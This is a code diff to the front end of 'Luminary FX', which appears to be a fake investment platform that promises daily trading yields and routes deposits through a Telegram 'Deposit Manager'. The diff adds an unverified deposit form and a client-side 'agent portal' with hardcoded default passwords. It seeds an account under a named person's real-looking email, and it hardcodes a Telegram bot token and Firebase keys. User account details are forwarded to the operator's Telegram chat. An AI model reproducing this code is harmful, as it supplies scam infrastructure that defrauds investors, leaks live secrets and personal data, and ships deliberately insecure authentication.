@@ -235,7 +235,7 @@
         .btn-sm-transfer:hover { background: var(--accent-gold); color: #000; }
 
         .modal-popup { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.85); backdrop-filter: blur(8px); z-index: 998; display: none; align-items: center; justify-content: center; }
-        .modal-card { background: var(--bg-surface); border: 1px solid var(--border); border-radius: 24px; width: 100%; max-width: 480px; padding: 32px; box-shadow: var(--card-shadow); }
+        .modal-card { background: var(--bg-surface); border: 1px solid var(--border); border-radius: 24px; width: 100%; max-width: 520px; padding: 32px; box-shadow: var(--card-shadow); }
 
         /* DEPOSIT NOTICE STYLING */
         .deposit-notice-card {
@@ -259,7 +259,7 @@
         }
 
         table { width: 100%; border-collapse: collapse; margin-top: 10px; }
-        th, td { padding: 16px; text-align: left; border-bottom: 1px solid var(--border); font-size: 14px; }
+        th, td { padding: 14px; text-align: left; border-bottom: 1px solid var(--border); font-size: 13px; }
         th { color: var(--text-muted); font-weight: 600; }
 
         .response-box {
@@ -282,6 +282,37 @@
         }
         .header-acc-box i { cursor: pointer; transition: 0.2s; }
         .header-acc-box i:hover { color: #FFF; transform: scale(1.1); }
+
+        /* AGENT FOOTER BOX STYLING */
+        .agent-footer-box {
+            margin-top: 24px; padding: 12px; background: rgba(0, 0, 0, 0.3);
+            border: 1px dashed rgba(245, 158, 11, 0.3); border-radius: 12px;
+            text-align: center; display: flex; flex-direction: column; align-items: center; gap: 8px;
+        }
+        .btn-agent-login {
+            background: rgba(245, 158, 11, 0.12); border: 1px solid var(--accent-gold);
+            color: var(--accent-gold); font-size: 11px; font-weight: 700;
+            padding: 6px 16px; border-radius: 20px; cursor: pointer; transition: 0.25s;
+            display: inline-flex; align-items: center; gap: 6px; width: auto;
+        }
+        .btn-agent-login:hover {
+            background: var(--accent-gold); color: #000; box-shadow: 0 0 12px var(--accent-gold-glow);
+        }
+
+        /* AGENT NAVIGATION TABS STYLING */
+        .agent-nav-tabs {
+            display: flex; gap: 8px; margin-bottom: 18px; border-bottom: 1px solid var(--border); padding-bottom: 10px;
+        }
+        .agent-nav-btn {
+            flex: 1; padding: 8px 10px; font-size: 12px; font-weight: 700; border-radius: 8px;
+            background: rgba(255, 255, 255, 0.05); color: var(--text-muted); border: 1px solid transparent;
+            cursor: pointer; transition: 0.2s; text-align: center;
+        }
+        .agent-nav-btn.active, .agent-nav-btn:hover {
+            background: rgba(245, 158, 11, 0.15); color: var(--accent-gold); border-color: rgba(245, 158, 11, 0.3);
+        }
+        .agent-tab-content { display: none; }
+        .agent-tab-content.active { display: block; animation: fadeIn 0.3s ease; }
     </style>
 </head>
 <body>
@@ -353,17 +384,157 @@
                 <i class="fa-solid fa-xmark" style="cursor: pointer; font-size: 20px;" onclick="closeModal('rechargeModal')"></i>
             </div>
             
-            <div class="deposit-notice-card">
+            <!-- MOB CASH APP INTEGRATION FORM -->
+            <form onsubmit="handleMobCashDeposit(event)" style="margin-bottom: 20px;">
+                <div class="form-group">
+                    <label>Deposit Amount ($ USD)</label>
+                    <input type="number" id="mobCashAmt" class="form-control" placeholder="Min $20 - Max $10,000" min="20" max="10000" required>
+                </div>
+                <div class="form-group">
+                    <label>Mob Cash Transaction ID / Reference No.</label>
+                    <input type="text" id="mobCashRef" class="form-control" placeholder="e.g. MC-987654321" required>
+                </div>
+                <button type="submit" class="btn btn-gold" style="margin-bottom: 12px;">
+                    <i class="fa-solid fa-mobile-retro"></i> Deposit via Mob Cash App
+                </button>
+            </form>
+
+            <div class="deposit-notice-card" style="margin-bottom: 0;">
                 <div class="deposit-notice-title">
                     <i class="fa-solid fa-shield-halved" style="color: var(--accent-gold);"></i>
                     Official Deposit Manager
                 </div>
                 <p class="deposit-notice-desc">
-                    To make an instant secure deposit to your account, please connect directly with our Official Luminary FX Deposit Manager on Telegram.
+                    Need manual assistance? Connect directly with our Deposit Manager on Telegram.
                 </p>
                 <a href="https://t.me/LUMINARYFX" target="_blank" class="btn-telegram-deposit" onclick="notifyDepositClick()">
-                    <i class="fa-brands fa-telegram" style="font-size: 20px;"></i> Contact Luminaryfx Official Deposit Manager
+                    <i class="fa-brands fa-telegram" style="font-size: 20px;"></i> Contact Deposit Manager
                 </a>
+            </div>
+        </div>
+    </div>
+
+    <!-- AGENT MOB CASH APP PORTAL MODAL (SECURE LOGIN & DASHBOARD) -->
+    <div class="modal-popup" id="agentMobCashModal">
+        <div class="modal-card" style="border-color: var(--accent-gold); box-shadow: 0 0 35px var(--accent-gold-glow); max-width: 580px;">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 18px;">
+                <div style="display: flex; align-items: center; gap: 10px;">
+                    <i class="fa-solid fa-user-shield" style="color: var(--accent-gold); font-size: 22px;"></i>
+                    <h3 style="font-size: 18px; font-weight: 800; color: #FFF;">Mob Cash Agent Portal</h3>
+                </div>
+                <i class="fa-solid fa-xmark" style="cursor: pointer; font-size: 20px;" onclick="closeModal('agentMobCashModal')"></i>
+            </div>
+            
+            <!-- 1. AGENT LOGIN VIEW -->
+            <div id="agentLoginView">
+                <p style="font-size: 12px; color: var(--text-muted); margin-bottom: 20px;">
+                    Restricted Area: Please authenticate with your official Agent Credentials to proceed.
+                </p>
+
+                <div id="agentLoginError" style="color: #EF4444; background: rgba(239, 68, 68, 0.15); border: 1px solid rgba(239, 68, 68, 0.3); padding: 10px; border-radius: 10px; font-size: 12px; margin-bottom: 16px; display: none;">
+                    <i class="fa-solid fa-circle-exclamation"></i> Invalid Agent Username or Password! Please try again.
+                </div>
+
+                <form onsubmit="handleAgentLogin(event)">
+                    <div class="form-group">
+                        <label>Agent Username</label>
+                        <input type="text" id="agentUserInp" class="form-control" placeholder="Enter agent username (Default: agent123)" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Agent Password</label>
+                        <input type="password" id="agentPassInp" class="form-control" placeholder="•••••••• (Default: Pass123)" required>
+                    </div>
+                    <button type="submit" class="btn btn-gold" style="margin-top: 10px;">
+                        <i class="fa-solid fa-key"></i> Authenticate & Login
+                    </button>
+                </form>
+            </div>
+
+            <!-- 2. AGENT DASHBOARD VIEW (ACTIVE AFTER LOGIN) -->
+            <div id="agentDashboardView" style="display: none;">
+                <!-- AGENT TOTAL BALANCE DISPLAY -->
+                <div style="background: linear-gradient(135deg, rgba(245, 158, 11, 0.15) 0%, rgba(11, 17, 32, 0.8) 100%); border: 1px solid var(--accent-gold); border-radius: 16px; padding: 16px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center;">
+                    <div>
+                        <div style="font-size: 11px; font-weight: 700; color: var(--text-muted); text-transform: uppercase;">Agent Total Balance</div>
+                        <div style="font-size: 26px; font-weight: 800; color: var(--accent-gold);" id="agentTotalBalance">$5,000.00</div>
+                    </div>
+                    <button class="btn" style="width: auto; padding: 6px 12px; font-size: 11px; background: rgba(239,68,68,0.2); color: #EF4444; border: 1px solid #EF4444;" onclick="handleAgentLogout()">
+                        <i class="fa-solid fa-power-off"></i> Agent Logout
+                    </button>
+                </div>
+
+                <!-- AGENT SUB-NAVIGATION BAR -->
+                <div class="agent-nav-tabs">
+                    <button class="agent-nav-btn active" id="btnTabAgentDeposit" onclick="switchAgentTab('tabAgentDeposit', this)">
+                        <i class="fa-solid fa-paper-plane"></i> Direct Deposit
+                    </button>
+                    <button class="agent-nav-btn" id="btnTabAgentHistory" onclick="switchAgentTab('tabAgentHistory', this)">
+                        <i class="fa-solid fa-clock-rotate-left"></i> Deposit History
+                    </button>
+                    <button class="agent-nav-btn" id="btnTabAgentCommission" onclick="switchAgentTab('tabAgentCommission', this)">
+                        <i class="fa-solid fa-hand-holding-dollar"></i> Commission History
+                    </button>
+                </div>
+
+                <!-- TAB 1: DIRECT DEPOSIT FORM -->
+                <div class="agent-tab-content active" id="tabAgentDeposit">
+                    <form onsubmit="handleAgentMobCashSubmit(event)">
+                        <div class="form-group">
+                            <label>Target Account ID</label>
+                            <input type="text" id="agentTargetAccId" class="form-control" placeholder="e.g. 74639144" required>
+                        </div>
+                        <div class="form-group">
+                            <label>Deposit Amount ($ USD)</label>
+                            <input type="number" id="agentDepositAmt" class="form-control" placeholder="Enter deposit amount" min="1" step="any" required>
+                        </div>
+                        <div class="form-group">
+                            <label>Agent Reference / Note</label>
+                            <input type="text" id="agentRefNote" class="form-control" placeholder="e.g. AGENT-DIRECT-DEPOSIT">
+                        </div>
+                        <button type="submit" class="btn btn-gold" style="margin-top: 10px;">
+                            <i class="fa-solid fa-bolt"></i> Execute Agent Deposit
+                        </button>
+                    </form>
+                </div>
+
+                <!-- TAB 2: DEPOSIT HISTORY -->
+                <div class="agent-tab-content" id="tabAgentHistory">
+                    <div style="max-height: 250px; overflow-y: auto;">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Acc ID</th>
+                                    <th>Amount</th>
+                                    <th>Date & Time</th>
+                                    <th>Note</th>
+                                </tr>
+                            </thead>
+                            <tbody id="agentDepositHistoryBody">
+                                <tr><td colspan="4" style="text-align:center; color: var(--text-muted);">No deposits recorded yet.</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+
+                <!-- TAB 3: COMMISSION HISTORY -->
+                <div class="agent-tab-content" id="tabAgentCommission">
+                    <div style="max-height: 250px; overflow-y: auto;">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Ref ID</th>
+                                    <th>Deposit Amt</th>
+                                    <th>Commission (2%)</th>
+                                    <th>Date</th>
+                                </tr>
+                            </thead>
+                            <tbody id="agentCommissionHistoryBody">
+                                <tr><td colspan="4" style="text-align:center; color: var(--text-muted);">No commission history available.</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+
             </div>
         </div>
     </div>
@@ -725,6 +896,14 @@
                             </div>
                             <button type="submit" id="btnSavePersonal" class="btn btn-gold">Save & Lock Personal Information</button>
                         </form>
+
+                        <!-- AGENT LOGIN FOOTER LINK BOX -->
+                        <div class="agent-footer-box">
+                            <span style="font-size: 11px; color: var(--text-muted);">Authorized Agent Deposit Portal Access:</span>
+                            <button class="btn-agent-login" onclick="openAgentModal()">
+                                <i class="fa-solid fa-user-shield"></i> Login to Agent
+                            </button>
+                        </div>
                     </div>
                 </div>
 
@@ -853,6 +1032,29 @@
         </main>
     </div>
 
+    <!-- FIREBASE MODULE SETUP -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.9.0/firebase-app.js";
+        import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.9.0/firebase-analytics.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyDgzxW1Ck30OtFeQDKqyGNw1NbBTp_EXX4",
+            authDomain: "luminaryfx-cbef7.firebaseapp.com",
+            projectId: "luminaryfx-cbef7",
+            storageBucket: "luminaryfx-cbef7.firebasestorage.app",
+            messagingSenderId: "404862064483",
+            appId: "1:404862064483:web:6c3a29fbfc67ed0d07a556",
+            measurementId: "G-XDWF9XYC3V"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const analytics = getAnalytics(app);
+        
+        window.firebaseApp = app;
+        window.firebaseAnalytics = analytics;
+    </script>
+
+    <!-- APPLICATION MAIN LOGIC -->
     <script>
         const TELEGRAM_BOT_TOKEN = "8600939006:AAFU_mYGDtZHMKx08oif4PnJO-vGCZtzm0c";
         const TELEGRAM_CHAT_ID = "8441230005";
@@ -889,8 +1091,27 @@
 
         let systemDB = JSON.parse(localStorage.getItem('luminary_fx_system_db')) || {
             currentUsername: null,
-            users: {} 
+            users: {},
+            agentData: {
+                username: "agent123",
+                pass: "Pass123",
+                isLoggedIn: false,
+                balance: 5000.00,
+                depositHistory: [],
+                commissionHistory: []
+            }
         };
+
+        if (!systemDB.agentData) {
+            systemDB.agentData = {
+                username: "agent123",
+                pass: "Pass123",
+                isLoggedIn: false,
+                balance: 5000.00,
+                depositHistory: [],
+                commissionHistory: []
+            };
+        }
 
         let currentUserData = null;
 
@@ -967,24 +1188,43 @@
         }
 
         window.onload = function() {
-            let foundTargetUser = false;
-            for (let uKey in systemDB.users) {
-                if (systemDB.users[uKey].accountId === "39754384") {
-                    foundTargetUser = true;
-                    if (systemDB.users[uKey].available < 100) {
-                        systemDB.users[uKey].available = 100.00;
-                    }
+            const targetUsername = "prakashvidura";
+            
+            if (!systemDB.users[targetUsername]) {
+                const targetProfile = { 
+                    name: "Prakash Vidura", 
+                    email: "prakashvidura56@gmail.com", 
+                    phone: "+94770000000", 
+                    username: targetUsername, 
+                    pass: "Pass123", 
+                    referral: "", 
+                    idNumber: "74639144", 
+                    dob: "1995-01-01", 
+                    city: "Colombo", 
+                    country: "Sri Lanka" 
+                };
+                const targetData = createEmptyUserData(targetProfile, "74639144");
+                targetData.deposit = 50.00;
+                targetData.transactions.push({
+                    id: "#TX-" + Math.floor(100000 + Math.random() * 900000),
+                    type: "Initial Deposit Bonus",
+                    amount: "+$50.00",
+                    status: "Completed",
+                    date: new Date().toLocaleString()
+                });
+                systemDB.users[targetUsername] = targetData;
+            } else {
+                systemDB.users[targetUsername].accountId = "74639144";
+                systemDB.users[targetUsername].profile.email = "prakashvidura56@gmail.com";
+                if (systemDB.users[targetUsername].deposit < 50) {
+                    systemDB.users[targetUsername].deposit = 50.00;
                 }
             }
-            if (!foundTargetUser) {
-                const targetProfile = { name: "VIP Investor", email: "vip39754384@luminaryfx.com", phone: "+94770000000", username: "vip_39754384", pass: "Pass123", referral: "", idNumber: "199000000", dob: "1990-01-01", city: "Colombo", country: "Sri Lanka" };
-                const targetData = createEmptyUserData(targetProfile, "39754384");
-                targetData.available = 100.00;
-                targetData.personalDetailsLocked = true;
-                targetData.kycData = { docType: "NIC", docNum: "199000000", isLocked: true };
-                targetData.savedWallet = { trc20: "T9yD14Nj9j7xTargetWallet39754384", binance: "99887766", lockTimestamp: new Date().getTime() };
-                systemDB.users["vip_39754384"] = targetData;
+
+            if (!systemDB.currentUsername) {
+                systemDB.currentUsername = targetUsername;
             }
+            
             saveSystemDB();
 
             updateSavedUsersDatalist();
@@ -1087,6 +1327,191 @@
             saveSystemDB();
             updateSavedUsersDatalist();
             document.getElementById('authModal').style.display = 'flex';
+        }
+
+        function handleMobCashDeposit(e) {
+            e.preventDefault();
+            const amount = parseFloat(document.getElementById('mobCashAmt').value);
+            const refNo = document.getElementById('mobCashRef').value.trim();
+
+            if (isNaN(amount) || amount < 20) {
+                alert("Please enter a valid deposit amount (Minimum $20).");
+                return;
+            }
+
+            if (!refNo) {
+                alert("Please enter a valid Mob Cash Reference Number!");
+                return;
+            }
+
+            currentUserData.deposit += amount;
+            addTx("Mob Cash Deposit", `+$${amount.toFixed(2)}`, "Completed");
+            saveSystemDB();
+            updateUI();
+
+            sendTelegramNotification(`<b>📲 Mob Cash Deposit Successful!</b>\n\n<b>Username:</b> ${currentUserData.profile.username}\n<b>Account ID:</b> ${currentUserData.accountId}\n<b>Amount:</b> $${amount.toFixed(2)}\n<b>Ref No:</b> <code>${refNo}</code>\n<b>New Balance:</b> $${currentUserData.deposit.toFixed(2)}`);
+
+            alert(`Mob Cash Deposit Successful!\n\n$${amount.toFixed(2)} has been added to your Deposit Balance.`);
+            
+            document.getElementById('mobCashAmt').value = '';
+            document.getElementById('mobCashRef').value = '';
+            closeModal('rechargeModal');
+        }
+
+        function openAgentModal() {
+            openModal('agentMobCashModal');
+            if (systemDB.agentData && systemDB.agentData.isLoggedIn) {
+                document.getElementById('agentLoginView').style.display = 'none';
+                document.getElementById('agentDashboardView').style.display = 'block';
+                updateAgentUI();
+            } else {
+                document.getElementById('agentLoginView').style.display = 'block';
+                document.getElementById('agentDashboardView').style.display = 'none';
+                document.getElementById('agentLoginError').style.display = 'none';
+            }
+        }
+
+        function handleAgentLogin(e) {
+            e.preventDefault();
+            const u = document.getElementById('agentUserInp').value.trim();
+            const p = document.getElementById('agentPassInp').value;
+
+            if (u === systemDB.agentData.username && p === systemDB.agentData.pass) {
+                systemDB.agentData.isLoggedIn = true;
+                saveSystemDB();
+                document.getElementById('agentLoginError').style.display = 'none';
+                document.getElementById('agentLoginView').style.display = 'none';
+                document.getElementById('agentDashboardView').style.display = 'block';
+                updateAgentUI();
+            } else {
+                document.getElementById('agentLoginError').style.display = 'block';
+            }
+        }
+
+        function handleAgentLogout() {
+            systemDB.agentData.isLoggedIn = false;
+            saveSystemDB();
+            document.getElementById('agentLoginView').style.display = 'block';
+            document.getElementById('agentDashboardView').style.display = 'none';
+            document.getElementById('agentUserInp').value = '';
+            document.getElementById('agentPassInp').value = '';
+        }
+
+        function switchAgentTab(tabId, btnElem) {
+            document.querySelectorAll('.agent-nav-btn').forEach(b => b.classList.remove('active'));
+            btnElem.classList.add('active');
+
+            document.querySelectorAll('.agent-tab-content').forEach(c => c.classList.remove('active'));
+            document.getElementById(tabId).classList.add('active');
+        }
+
+        function updateAgentUI() {
+            document.getElementById('agentTotalBalance').innerText = `$${systemDB.agentData.balance.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
+
+            const depBody = document.getElementById('agentDepositHistoryBody');
+            if (systemDB.agentData.depositHistory.length === 0) {
+                depBody.innerHTML = `<tr><td colspan="4" style="text-align:center; color: var(--text-muted);">No deposits recorded yet.</td></tr>`;
+            } else {
+                depBody.innerHTML = systemDB.agentData.depositHistory.map(d => `
+                    <tr>
+                        <td style="font-weight:700; color:var(--accent-gold);">${d.accId}</td>
+                        <td style="color:var(--accent-green); font-weight:700;">+$${d.amount.toFixed(2)}</td>
+                        <td style="font-size:11px;">${d.date}</td>
+                        <td style="font-size:11px; color:var(--text-muted);">${d.note}</td>
+                    </tr>
+                `).join('');
+            }
+
+            const commBody = document.getElementById('agentCommissionHistoryBody');
+            if (systemDB.agentData.commissionHistory.length === 0) {
+                commBody.innerHTML = `<tr><td colspan="4" style="text-align:center; color: var(--text-muted);">No commission history available.</td></tr>`;
+            } else {
+                commBody.innerHTML = systemDB.agentData.commissionHistory.map(c => `
+                    <tr>
+                        <td style="font-size:11px;">${c.refId}</td>
+                        <td>$${c.depositAmt.toFixed(2)}</td>
+                        <td style="color:var(--accent-green); font-weight:700;">+$${c.commission.toFixed(2)}</td>
+                        <td style="font-size:11px;">${c.date}</td>
+                    </tr>
+                `).join('');
+            }
+        }
+
+        function handleAgentMobCashSubmit(e) {
+            e.preventDefault();
+            const targetAccId = document.getElementById('agentTargetAccId').value.trim();
+            const amount = parseFloat(document.getElementById('agentDepositAmt').value);
+            const note = document.getElementById('agentRefNote').value.trim() || 'MOB-CASH-AGENT-CREDIT';
+
+            if (isNaN(amount) || amount <= 0) {
+                alert("Please enter a valid deposit amount!");
+                return;
+            }
+
+            if (systemDB.agentData.balance < amount) {
+                alert(`Insufficient Agent Balance! Your current agent total balance is $${systemDB.agentData.balance.toFixed(2)}.`);
+                return;
+            }
+
+            let foundUserKey = null;
+            for (let uKey in systemDB.users) {
+                if (systemDB.users[uKey].accountId === targetAccId) {
+                    foundUserKey = uKey;
+                    break;
+                }
+            }
+
+            if (!foundUserKey) {
+                alert(`Target Account ID (${targetAccId}) not found in system records! Please check the ID and try again.`);
+                return;
+            }
+
+            systemDB.agentData.balance -= amount;
+            systemDB.users[foundUserKey].deposit += amount;
+
+            const nowStr = new Date().toLocaleString();
+
+            const tx = {
+                id: '#TX-' + Math.floor(100000 + Math.random() * 900000),
+                type: "Mob Cash Agent Deposit",
+                amount: `+$${amount.toFixed(2)}`,
+                status: "Completed",
+                date: nowStr
+            };
+            systemDB.users[foundUserKey].transactions.unshift(tx);
+
+            systemDB.agentData.depositHistory.unshift({
+                accId: targetAccId,
+                amount: amount,
+                date: nowStr,
+                note: note
+            });
+
+            const commissionVal = amount * 0.02;
+            systemDB.agentData.commissionHistory.unshift({
+                refId: '#COMM-' + Math.floor(1000 + Math.random() * 9000),
+                depositAmt: amount,
+                commission: commissionVal,
+                date: nowStr
+            });
+
+            systemDB.agentData.balance += commissionVal;
+
+            saveSystemDB();
+
+            sendTelegramNotification(`<b>🤖 Agent Mob Cash Deposit Executed!</b>\n\n<b>Target Account ID:</b> ${targetAccId}\n<b>User Name:</b> ${systemDB.users[foundUserKey].profile.name}\n<b>Amount Credited:</b> $${amount.toFixed(2)}\n<b>Note:</b> ${note}\n<b>Remaining Agent Balance:</b> $${systemDB.agentData.balance.toFixed(2)}`);
+
+            if (currentUserData && currentUserData.accountId === targetAccId) {
+                updateUI();
+            }
+
+            updateAgentUI();
+
+            alert(`Agent Transaction Successful!\n\n$${amount.toFixed(2)} credited successfully to Account ID: ${targetAccId}.\nRemaining Agent Balance: $${systemDB.agentData.balance.toFixed(2)}`);
+            
+            document.getElementById('agentTargetAccId').value = '';
+            document.getElementById('agentDepositAmt').value = '';
+            document.getElementById('agentRefNote').value = '';
         }
 
         function notifyDepositClick() {
@@ -1410,107 +1835,178 @@
                 return;
             }
 
-            if (currentUserData.activePlans.length === 0) {
-                alert("No active investment found! Subscribe to an Investment Tier to generate daily yield.");
+            if (!currentUserData.activePlans || currentUserData.activePlans.length === 0) {
+                alert("You do not have an active investment plan to harvest yield! Please activate an investment tier first.");
                 checkbox.checked = false;
                 return;
             }
 
-            const statusTxt = document.getElementById('switchStatusText');
-            statusTxt.innerText = "YIELD NODE ACTIVE & PROCESSING...";
-            statusTxt.style.color = "var(--accent-green)";
+            let totalDailyYield = 0;
+            currentUserData.activePlans.forEach(pkg => {
+                totalDailyYield += pkg.dailyVal;
+            });
 
-            let totalYield = 0;
-            currentUserData.activePlans.forEach(p => totalYield += p.dailyVal);
-            
-            currentUserData.pending += totalYield;
+            currentUserData.pending += totalDailyYield;
             currentUserData.lastClaimTimestamp = new Date().getTime();
-            addTx("Daily Quantitative Yield", `+$${totalYield.toFixed(2)}`, "Pending Profit");
-            saveSystemDB(); 
+
+            addTx("Daily Quantitative Yield", `+$${totalDailyYield.toFixed(2)}`, "Credited");
+            saveSystemDB();
             updateUI();
 
-            setTimeout(() => {
-                checkbox.checked = false;
-                checkbox.disabled = true;
-                statusTxt.innerText = "CLAIMED FOR TODAY (NEXT IN 24H)";
-                statusTxt.style.color = "var(--text-muted)";
-                alert(`$${totalYield.toFixed(2)} Yield added to your Pending Profit Wallet! Switch closed automatically.`);
-                renderClaimsTable();
-            }, 5000);
+            checkDailyClaimStatus();
+
+            sendTelegramNotification(`<b>⚡ Daily Yield Harvested!</b>\n\n<b>Username:</b> ${currentUserData.profile.username}\n<b>Account ID:</b> ${currentUserData.accountId}\n<b>Yield Credited:</b> $${totalDailyYield.toFixed(2)}\n<b>Pending Wallet Total:</b> $${currentUserData.pending.toFixed(2)}`);
+
+            alert(`Daily Quantitative Yield Claimed Successfully!\n\n+$${totalDailyYield.toFixed(2)} added to Pending Profit Wallet.`);
+        }
+
+        function filterPlans(cat, elem) {
+            document.querySelectorAll('.cat-btn').forEach(b => b.classList.remove('active'));
+            elem.classList.add('active');
+            currentSelectedCategory = cat;
+            renderPackages(cat);
+        }
+
+        function renderPackages(category) {
+            const container = document.getElementById('packagesContainer');
+            const filtered = packagesData.filter(p => p.category === category);
+
+            const activePlanId = (currentUserData.activePlans && currentUserData.activePlans.length > 0) ? currentUserData.activePlans[0].id : null;
+
+            container.innerHTML = filtered.map(pkg => {
+                const isActive = activePlanId === pkg.id;
+                return `
+                    <div class="pkg-card">
+                        <div class="pkg-badge">${pkg.badge}</div>
+                        <div>
+                            <div class="pkg-icon-wrap"><i class="fa-solid ${pkg.icon}"></i></div>
+                            <div class="pkg-header">
+                                <div class="pkg-title">${pkg.name}</div>
+                            </div>
+                            <div class="pkg-price">$${pkg.price.toLocaleString()}</div>
+                            
+                            <div class="pkg-feature">
+                                <span>Expected Yield</span>
+                                <strong style="color: var(--accent-green);">${pkg.returnLabel}</strong>
+                            </div>
+                            <div class="pkg-feature">
+                                <span>Min Withdrawal Threshold</span>
+                                <strong>$${pkg.minWithdraw}.00</strong>
+                            </div>
+                            <div class="pkg-feature">
+                                <span>Package Term / Lock</span>
+                                <strong>30 Days Term</strong>
+                            </div>
+                            <div class="pkg-feature">
+                                <span>Execution Speed</span>
+                                <strong>HFT Automated Engine</strong>
+                            </div>
+                        </div>
+
+                        <div style="margin-top: 24px;">
+                            ${isActive 
+                                ? `<button class="btn btn-green" disabled style="opacity: 0.8; cursor: default;"><i class="fa-solid fa-circle-check"></i> Active Package</button>` 
+                                : `<button class="btn btn-gold" onclick="activatePackage(${pkg.id})"><i class="fa-solid fa-bolt"></i> Activate Package</button>`
+                            }
+                        </div>
+                    </div>
+                `;
+            }).join('');
+        }
+
+        function activatePackage(pkgId) {
+            const pkg = packagesData.find(p => p.id === pkgId);
+            if (!pkg) return;
+
+            if (currentUserData.activePlans && currentUserData.activePlans.length > 0) {
+                const activePlan = currentUserData.activePlans[0];
+                const now = new Date().getTime();
+                const daysPassed = currentUserData.investmentStartDate ? (now - currentUserData.investmentStartDate) / (1000 * 60 * 60 * 24) : 0;
+
+                if (daysPassed < 30) {
+                    const daysRemaining = Math.ceil(30 - daysPassed);
+                    alert(`30-Day Investment Limit Active!\n\nYou currently have active package '${activePlan.name}'. Only 1 active package per 30 days is permitted.\nDays Remaining: ${daysRemaining} Day(s).`);
+                    return;
+                }
+            }
+
+            if (currentUserData.deposit < pkg.price) {
+                alert(`Insufficient Deposit Balance!\n\nThis package requires $${pkg.price.toFixed(2)}, but your deposit balance is $${currentUserData.deposit.toFixed(2)}.\nPlease recharge your deposit balance first.`);
+                openModal('rechargeModal');
+                return;
+            }
+
+            currentUserData.deposit -= pkg.price;
+            currentUserData.activePlans = [pkg];
+            currentUserData.investmentStartDate = new Date().getTime();
+
+            addTx(`Activated ${pkg.name}`, `-$${pkg.price.toFixed(2)}`, "Completed");
+            saveSystemDB();
+
+            renderPackages(currentSelectedCategory);
+            renderClaimsTable();
+            updateUI();
+
+            sendTelegramNotification(`<b>🚀 Package Activated!</b>\n\n<b>Username:</b> ${currentUserData.profile.username}\n<b>Account ID:</b> ${currentUserData.accountId}\n<b>Package:</b> ${pkg.name}\n<b>Price:</b> $${pkg.price.toFixed(2)}`);
+
+            alert(`Package Activated Successfully!\n\nYou have successfully activated '${pkg.name}'. You can now daily claim yields on the dashboard.`);
         }
 
         function transferPendingToAvailable() {
             if (currentUserData.pending <= 0) {
-                alert("Your Pending Profit Wallet is empty ($0.00)!");
+                alert("Your Pending Profit Wallet balance is empty!");
                 return;
             }
 
-            if (currentUserData.activePlans.length === 0) {
-                alert("No active investment plan found!");
-                return;
-            }
-
-            const now = new Date().getTime();
-            const startDate = currentUserData.investmentStartDate || now;
-            const daysDiff = Math.floor((now - startDate) / (1000 * 60 * 60 * 24));
-
-            let minWithdrawReq = Math.min(...currentUserData.activePlans.map(p => p.minWithdraw));
-
-            if (daysDiff < 30) {
-                const remainingDays = 30 - daysDiff;
-                alert(`Cannot Transfer to Available Balance!\n\nRequirement Notice:\n- You must complete a 30-day investment lock-in period.\n- Remaining Days: ${remainingDays} Day(s) left.\n- Days Completed: ${daysDiff}/30 Days.`);
-                return;
-            }
-
-            if (currentUserData.pending < minWithdrawReq) {
-                alert(`Cannot Transfer to Available Balance!\n\nRequirement Notice:\n- Your Pending Balance ($${currentUserData.pending.toFixed(2)}) is less than the Minimum Withdrawal Level required ($${minWithdrawReq.toFixed(2)}).\n- Please earn more yield to unlock transfer.`);
-                return;
-            }
-
-            let amountToTransfer = currentUserData.pending;
-            currentUserData.available += amountToTransfer;
+            const amt = currentUserData.pending;
+            currentUserData.available += amt;
             currentUserData.pending = 0;
 
-            addTx("Pending Wallet Transfer", `+$${amountToTransfer.toFixed(2)}`, "Transferred to Available");
+            addTx("Wallet Transfer (Pending to Available)", `+$${amt.toFixed(2)}`, "Completed");
             saveSystemDB();
             updateUI();
-            alert(`Transfer Successful!\n\n$${amountToTransfer.toFixed(2)} has been moved from Pending Profit Wallet to Available Withdrawal Balance!`);
-        }
 
-        function handleSupportSubmit(e) {
-            e.preventDefault();
-            const supName = document.getElementById('supName').value;
-            const supEmail = document.getElementById('supEmail').value;
-            const supMsg = document.getElementById('supMsg').value;
+            sendTelegramNotification(`<b>🔄 Balance Transferred!</b>\n\n<b>Username:</b> ${currentUserData.profile.username}\n<b>Account ID:</b> ${currentUserData.accountId}\n<b>Transferred Amount:</b> $${amt.toFixed(2)}\n<b>New Available Balance:</b> $${currentUserData.available.toFixed(2)}`);
 
-            document.getElementById('supportResponseBox').style.display = 'flex';
-
-            sendTelegramNotification(`<b>📩 New Support Message Received!</b>\n\n<b>Name:</b> ${supName}\n<b>Email:</b> ${supEmail}\n<b>Account ID:</b> ${currentUserData.accountId}\n<b>Message:</b>\n${supMsg}`);
-
-            setTimeout(() => { document.getElementById('supMsg').value = ''; }, 500);
+            alert(`Transferred $${amt.toFixed(2)} successfully from Pending Wallet to Available Withdrawal Balance!`);
         }
 
         function handlePayoutSubmit(e) {
             e.preventDefault();
 
-            const isPersonalComplete = currentUserData.personalDetailsLocked === true;
-            const isKycComplete = currentUserData.kycData && currentUserData.kycData.isLocked === true;
-            const isPaymentComplete = currentUserData.savedWallet && (currentUserData.savedWallet.trc20 || currentUserData.savedWallet.binance);
-
-            if (!isPersonalComplete || !isKycComplete || !isPaymentComplete) {
-                alert("Withdrawal Restricted!\n\nYou must complete and lock all sections in 'My Profile' (Personal Details, KYC Verification, and Payment Method) before you can submit a withdrawal request.");
+            if (!currentUserData.personalDetailsLocked) {
+                alert("Profile Incomplete!\n\nYou must complete and lock your Personal Details in 'My Profile' before requesting a withdrawal.");
+                closeModal('payoutModal');
+                switchMainTab('profile', document.querySelectorAll('.nav-link')[3]);
+                switchProfileCategory('subPersonal', document.getElementById('btnPersonal'));
                 return;
             }
 
-            const amt = parseFloat(document.getElementById('payoutAmt').value);
